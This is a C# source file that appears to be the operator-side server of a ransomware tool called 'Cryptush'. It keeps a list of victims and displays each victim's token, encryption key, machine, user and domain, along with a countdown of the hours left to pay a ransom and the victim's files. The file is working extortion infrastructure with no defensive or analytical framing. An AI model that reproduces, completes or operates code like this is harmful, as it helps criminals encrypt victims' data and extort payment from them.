using System;
using System.Collections.Generic;
using System.Globalization;
using ConsoleTables;
using Cryptush.lib;

namespace Server
{
    class Db
    {
        public static List<Agent> victims = new();
        public static void ListVictims()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            var table = new ConsoleTable("Token", "Key", "Machine", "User", "Domain", "Launch Time", "Time left for payment");
            foreach (Agent victim in victims)
            {
                string timeZone = victim.AgentTimeZone.Split(':')[0].Replace("0", "");
                if (!(timeZone.Contains('-'))) { timeZone = '+' + timeZone; }
                table.AddRow(victim.guid, victim.Key, victim.MachineName, victim.Username, victim.Domain,
                    victim.StartDate + $" [UTC {timeZone}]", TimeLeft(GetAdjustedTime(victim)));
            }
            table.Write();
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
        }
        public static string TimeLeft(DateTime AdjustedStartDate)
        {
            DateTime LastTime2Pay = AdjustedStartDate.AddHours(24);
            DateTime dateTimeNow = DateTime.Now;
            var diff = LastTime2Pay - dateTimeNow;
            if (diff.TotalSeconds > 0)
            {
                return diff.ToString();
            }
            else { return "0"; }
        }

        public static void ListFiles(string token)
        {
            try
            {
                var selVictim = victims.Find(victim => victim.guid.ToString() == token);
                if (selVictim != null)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    foreach (string file in selVictim.Files)
                    {
                        Console.WriteLine(file);
                    }
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("\n");
                }
                else { Console.WriteLine("\nError: token not found."); }
                
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\nUnexpected error: {ex.Message}");
            }
        }

        public static DateTime GetAdjustedTime(Agent victim)
        {
            TimeZone localZone = TimeZone.CurrentTimeZone;
            DateTime currentDate = DateTime.Now;
            TimeSpan currentOffset = localZone.GetUtcOffset(currentDate);        
            DateTime victimStartDate = DateTime.Parse(victim.StartDate, new CultureInfo(victim.DateTimeCulture, false));
            TimeSpan victimOffset = TimeSpan.Parse(victim.AgentTimeZone);
            
            double TimeDifference = (currentOffset - victimOffset).TotalHours;
            victimStartDate = victimStartDate.AddHours(TimeDifference);
            return victimStartDate;
        }
    }
}
